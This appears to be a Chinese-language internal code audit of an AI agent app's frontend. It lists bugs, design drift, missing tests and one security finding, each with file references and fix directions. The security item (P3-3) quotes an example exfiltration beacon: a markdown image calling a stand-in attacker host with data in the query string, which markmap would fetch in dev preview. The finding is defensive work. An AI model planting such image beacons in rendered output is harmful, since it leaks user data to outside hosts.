## P2

### P2-1 [DRIFT] RunResources「思考」档展示 reasoning_effort，但该旋钮对真实 LLM 调用零效果

**证据（两端均已读到）**：
- 前端：`RunResources.tsx:69-72` 渲染「思考」行 = `reasoningMeta(agent.thinking, agent.reasoningEffort).label` → 产出「思考 (high)」/「深度思考 (max)」，`types.ts:134-144` 的 label 明说「最强推理强度 / 标准思考强度」（暗示已作用于模型）。
- 前端默认值：`stores/execution/project.ts:54` `reasoningEffort: spec.reasoningEffort ?? "high"`、`:162` `?? "high"`——后端未指定时展示层仍默认「high」。
- 后端（产出侧）：`llm/provider/openai_compatible.py:261-274` 的 `_build_payload`（组装发往 provider 的**唯一**请求体）只含 `model/messages/stream/temperature/max_tokens/tools/tool_choice/stream_options`，**从不携带 `reasoning_effort` 或任何 reasoning 参数**。
- `runtime/runs/builder.py:356,377` 证实 `reasoning_effort` 仅从 task item 解析进 RunSpec、**只透传**，不入 provider 请求。
- 佐证：`types.ts:114-119` 自注「no worker tier is non-thinking anymore（dev-stage: both tiers think at `high`）」——故「思考」行对绝大多数 worker 恒显「思考 (high)」，high↔max 仅取决于 `reasoning_effort`，而该值不达 API。

**影响**：run 详情向用户/开发者宣称一个「每 worker 推理强度」旋钮在起作用（尤其「深度思考 (max)·最强推理强度」），实际从未喂给模型，high↔max 是**虚构区分**。此正是后端审计「reasoning_effort 旋钮对真实调用零效果」在前端的放大呈现。次要地：内测默认 BYOK 下「快速档/强力档」全链路走同一用户模型（`前端UX设计.md §十三`「统一用该模型」），「档位」也仅回合预算有别、非模型有别，但档位尚有真实效果、故不单列。

**修复方向**：二选一——① 后端把 `reasoning_effort` 真正接入 provider 请求（若 provider 支持）；② 未接通前，展示层去掉 high/max 细分、只留「思考 / 非思考」，避免宣称不存在的推理强度。

### P2-2 [DESIGN] reviewConcern 未按角色收口，任意 worker 正文含触发词即误报「方向风险/待关注」红牌

**证据（两端均已读到）**：
- 定义侧：`lib/reviewConcern.ts:1-5` docstring 明确限定「review / QC worker output（简介流水线等）」；`:8-14` `DIRECTION_PATTERNS` 含 `整体方向`/`根本性`/`致命`/`方向(?:不对|偏|问题|有误)`/`建议(?:叫停|重写|推翻)`，命中即 `critical`。
- 消费侧：`components/graph/projectFlowGraph.ts:263-264` 对**每一个 run** 的 `output` 无条件 `detectReviewConcern(output)`（仅 `length >= 12` 一道门），**无角色判定**；结果落 `reviewConcern` → `agentNode/presentation.ts:80-81`「方向风险」（critical，红）/「待关注」（warning）→ `AgentNodeFace.tsx:200-205` 显徽章。

**影响**：任何普通（非评审）worker 的正文只要出现「整体方向」「根本性」等**日常分析用词**（如研究员写「从整体方向把握…」），其图节点即挂红色「方向风险」徽章，误导老板以为队员上报了致命方向问题。徽章是「中间可见性」的核心信号，误报直接侵蚀其可信度。

**修复方向**：把检测收口到评审/QC 角色（或结构化 `contract`/`review` 字段），或要求分数/方向措辞出现在明确的「评审结论」语境；纯启发式扫全员正文噪音大。

## P3

### P3-1 [BUG] reviewConcern 分数正则误伤日期/分数表达

**证据**：`lib/reviewConcern.ts:16` `SCORE_RE = /(\d{1,2})\s*\/\s*10/g`；`:33-35` score≤5→critical、≤7→warning。凡形如「7/10」的串都命中——「预计 7/10 完成」（7月10日）、「3/10 天」（十分之三）等日期/分数会被判成低分评审 → 误挂 warning/critical 徽章。与 P2-2 叠加放大误报面。

**影响**：非评分语境的日期/分数 token 触发虚假审查预警。

**修复方向**：限定到评分语境（要求「评分/得分/分」等前后缀），或要求「N 分」而非裸 `N/10`。

### P3-2 [DRIFT] RunResources 原样把后端成本当权威精确值呈现（三价拆分），无「可能失真」提示

**证据（前端已读到，后端引审计 01）**：`RunResources.tsx:55-86` 无条件将 `cost.total/input/output/cached` 格式化为精确 `¥ + $ + 输入/输出/缓存省` 三价拆分，**无任何「估算/可能不准」标注**。后端审计 01 已发现「platform 模式默认模型不在定价表 → 计价按 Flash 低估」。前端作为忠实渲染器把低估值以「三价精确」的观感放大其可信度（`formatCost` 已把 0/未定价折「—」，故 BYOK 显「—」不受影响，问题仅在 platform 模式）。

**影响**：platform 模式用户看到被低估的 ¥ 却呈现为高精度可信数字。

**修复方向**：根因在后端定价表补全；前端可在「模型不在定价表」时对该 run 成本加一枚脚注/星号弱化其权威性。（根因后端，前端为忠实渲染。）

### P3-3 [SEC] markmap 渲染路径缺 CSP 无关的引擎级外泄防线，仅靠生产 CSP 兜底

**证据（两端已读到）**：`Diagram.tsx` 中 mermaid 走 `securityLevel:"strict"`（:451）、vega 走 `makeSafeLoader`（:99-107，拒一切非 `data:/blob:` 取数），二者皆是**与 CSP 无关的 JS 层**防线；普通 markdown 图片亦有 `Markdown.tsx:216-231` 的 `<img>` 降级（JS 层）。唯 markmap（`MarkmapCanvas`，:502-544）**无任何引擎级消毒/取图拦截**，`markmap-lib`/`markmap-view` 无 `sanitize` 调用（依赖其默认行为）。生产 electron 由 `main/index.ts:83` `img-src 'self' data: <API_ORIGIN>` 在**网络层**拦死第三方远程图，且 :79-82 注释**已显式点名 markmap** 被此 CSP 覆盖——故**非生产漏洞**。

**影响**：防线不对称——在 CSP 不生效的语境（如 `pnpm dev:web` 浏览器预览）渲染含 `![](http://attacker/?d=…)` 的 ```markmap 块时，markmap 会零点击拉取远程图（潜在外泄信标），而同场景下普通图片（img 降级）、vega（safe-loader）仍受 JS 层保护。真实危害低（dev/预览工具、非生产、非真实不可信 AI 流量），但三引擎防护姿态不一致。

**修复方向**：给 markmap 补一道 JS 层防线（渲染后扫描/移除远程 `<img>`，或用受限 transformer），与 mermaid/vega 对齐，不把 markmap 的安全**全部**押在 CSP 上。

### P3-4 [TEST] 证据徽章渲染接缝无端到端测试，仅覆盖 mdast 变换

**证据**：`lib/__tests__/remarkEvidence.test.ts` 只测 `splitEvidenceText` + attacher（mdast 层），**未测**「react-markdown 把 `evidencemark` 映射到 `EvidenceBadge` 且 `hProperties.dataKind` 存活为 `data-kind` prop」这条最脆弱的接缝——它依赖 property-information 对 data-* 属性的 camelCase→kebab 转换（`remarkEvidence.ts:47-56` 设 `dataKind`，`EvidenceBadge.tsx:19-25` 读 `"data-kind"`）。

**影响**：react-markdown / hast-util-to-jsx-runtime / property-information 任一升级若改变 data-prop 命名，可能静默令 `kind` 恒为 undefined → **所有**徽章退化为「待核实」（连已核实主张也误显未核实），却无测试拦截。

**修复方向**：补一条 jsdom render 测试：含 `【已核实·X】` 的 markdown（`evidence`）渲出 success 徽章「已核实·X」、`【待核实】` 渲出 muted「待核实」。

### P3-5 [DESIGN/TEST] mermaidNormalize 桌面/手机双份复制，无共享源亦无一致性测试

**证据**：`apps/desktop/src/renderer/lib/mermaidNormalize.ts` 与 `apps/mobile/src/lib/mermaidNormalize.ts` **字节级等价**（仅 :50-53 一处条件换行排版不同），各自一份、无共享模块、无跨端等值/快照测试。按 `cross-platform-frontend.mdc`，渲染层「各端全新建」是既定策略、且 Markdown/Diagram 属**可选可共享的纯渲染叶子**；但当前是「复制」而非「共享叶子」，且协议 conformance 只巡检 fold、不覆盖此纯函数。

**影响**：日后改一端（如新增一条 mermaid 修复）另一端静默漂移 → 手机端图表健壮性与桌面不一致，无门禁可发现。

**修复方向**：择一——把该纯函数下沉为共享叶子（规则允许），或加一条跨文件等值/快照测试锁死两份一致。

### P3-6 [nit] ResourceSection 折叠态用瞬态 useState，与同族区段（思考/工具/诊断）持久化不一致

**证据**：`RunResources.tsx:29` `useState(defaultExpanded)`——纯本地态；而 `RunThinking.tsx:21`（`useStreamAwareDisclosure`）、`RunToolCalls.tsx:116`（同）、`RunDiagnostics.tsx:27`（`usePersistentDisclosure`）均走可持久化 disclosure。故「资源消耗」被用户收起后，面板关闭/重开或切 run 即重置回默认展开。

**影响**：轻微 UX 不一致；用户对「资源消耗」的收起选择不被记住。

**修复方向**：改用 `usePersistentDisclosure` + `keyBase` 作 key（与同族区段一致），或显式接受不持久化并去掉不必要的差异。
